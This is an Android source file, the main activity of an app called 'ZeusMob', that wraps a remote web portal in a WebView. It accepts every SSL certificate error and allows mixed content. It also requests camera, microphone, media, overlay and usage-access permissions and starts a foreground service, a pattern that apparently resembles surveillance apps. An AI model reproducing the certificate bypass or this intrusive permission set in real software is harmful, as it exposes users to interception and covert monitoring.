package com.zeusmob.app;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.net.http.SslError;
import android.webkit.SslErrorHandler;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.zeusmob.app.service.ZeusForegroundService;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final String TAG          = "ZEUS_DEBUG";
    private static final int    REQ_PERMISSIONS = 100;
    private static final int    REQ_OVERLAY     = 101;

    private WebView webView;
    private Handler retryHandler = new Handler(Looper.getMainLooper());
    private String  portalUrl;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "=== MainActivity.onCreate() ===");
        setContentView(R.layout.activity_main);

        setupWebView();
        requestAllPermissions();
        startForegroundServiceSafe();
    }

    // ── WebView ────────────────────────────────────────────────────
    private void setupWebView() {
        webView = findViewById(R.id.webview_main);

        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        ws.setCacheMode(WebSettings.LOAD_DEFAULT);
        ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        ws.setDatabaseEnabled(true);
        ws.setUserAgentString(ws.getUserAgentString() + " ZeusMobApp/1.0");

        webView.setWebChromeClient(new WebChromeClient());
        webView.setWebViewClient(new WebViewClient() {

            // Manter todas as navegações dentro do WebView (sem abrir Chrome externo)
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                Log.d(TAG, "shouldOverrideUrlLoading: " + request.getUrl());
                return false; // false = WebView gere internamente
            }

            // Aceitar certificados SSL mesmo com erros (útil para dev e certificados autoassinados)
            @Override
            public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
                Log.w(TAG, "SSL error ignorado (proceed): " + error.toString());
                handler.proceed();
            }

            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                Log.d(TAG, "onPageStarted: " + url);
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                Log.d(TAG, "onPageFinished: " + url);
            }

            // Capturar erros de carregamento e recarregar automaticamente após 5 segundos
            @Override
            public void onReceivedError(WebView view, WebResourceRequest request,
                                        WebResourceError error) {
                if (request.isForMainFrame()) {
                    String desc = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                        ? error.getDescription().toString()
                        : "erro desconhecido";
                    Log.w(TAG, "❌ Erro ao carregar página: " + desc
                        + " | URL: " + request.getUrl()
                        + " — recarregando em 5s");

                    retryHandler.removeCallbacksAndMessages(null);
                    retryHandler.postDelayed(() -> {
                        if (webView != null) {
                            Log.d(TAG, "Recarregando URL: " + portalUrl);
                            webView.loadUrl(portalUrl);
                        }
                    }, 5000);
                }
            }
        });

        // Carregar URL do portal definida em strings.xml (injetada no build)
        portalUrl = getString(R.string.app_link);
        if (portalUrl == null || portalUrl.trim().isEmpty()) {
            portalUrl = "https://67cc0a24-f21b-4384-b1dc-7ea4a07ae976-00-3s3efgf80iyzd.kirk.replit.dev";
        }
        Log.d(TAG, "Carregando portal URL: " + portalUrl);
        webView.loadUrl(portalUrl);
    }

    // ── Back button navega no histórico do WebView ─────────────────
    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }

    // ── Permissões ─────────────────────────────────────────────────
    private void requestAllPermissions() {
        Log.d(TAG, "Solicitando permissões do sistema...");
        List<String> needed = new ArrayList<>();

        String[] perms = {
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO,
            Manifest.permission.POST_NOTIFICATIONS,
        };

        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                needed.add(p);
            }
        }
        if (!needed.isEmpty()) {
            Log.d(TAG, "Pedindo permissões: " + needed.toString());
            ActivityCompat.requestPermissions(this, needed.toArray(new String[0]), REQ_PERMISSIONS);
        } else {
            Log.d(TAG, "Todas as permissões já concedidas");
        }

        // Overlay (Draw Over Apps)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            Log.d(TAG, "Pedindo permissão SYSTEM_ALERT_WINDOW...");
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, REQ_OVERLAY);
        }

        // Usage Stats
        try {
            Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.w(TAG, "Não foi possível abrir Usage Access Settings: " + e.getMessage());
        }
    }

    // ── Foreground Service ─────────────────────────────────────────
    private void startForegroundServiceSafe() {
        Log.d(TAG, "Iniciando ZeusForegroundService...");
        Intent svc = new Intent(this, ZeusForegroundService.class);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            Log.d(TAG, "ZeusForegroundService iniciado com sucesso");
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar ZeusForegroundService: " + e.getMessage());
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
            @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        for (int i = 0; i < permissions.length; i++) {
            String result = (grantResults[i] == PackageManager.PERMISSION_GRANTED) ? "GRANTED" : "DENIED";
            Log.d(TAG, "Permissão " + permissions[i] + ": " + result);
        }
    }

    @Override
    protected void onDestroy() {
        retryHandler.removeCallbacksAndMessages(null);
        if (webView != null) { webView.destroy(); webView = null; }
        super.onDestroy();
    }
}
